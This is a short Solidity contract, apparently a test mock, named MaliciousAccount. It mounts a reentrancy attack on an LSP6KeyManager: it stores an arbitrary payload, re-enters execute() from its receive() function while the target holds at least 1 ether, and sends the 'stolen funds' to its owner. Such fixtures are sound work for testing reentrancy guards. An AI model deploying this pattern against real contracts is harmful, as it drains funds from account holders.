pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

import {LSP6KeyManager} from "../LSP6KeyManager/LSP6KeyManager.sol";

contract MaliciousAccount is Ownable {
    LSP6KeyManager public entryPoint;
    address public target;

    bytes public payload;

    constructor(LSP6KeyManager _keyManager) {
        entryPoint = _keyManager;
        target = address(_keyManager.account());
    }

    function loadPayload(bytes calldata _payload) public {
        payload = _payload;
    }

    function attack() public {
        entryPoint.execute(payload);
    }

    function withdrawStolenFunds() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {
        // re-enter the call...
        if (target.balance >= 1 ether) {
            attack();
        }
    }
}
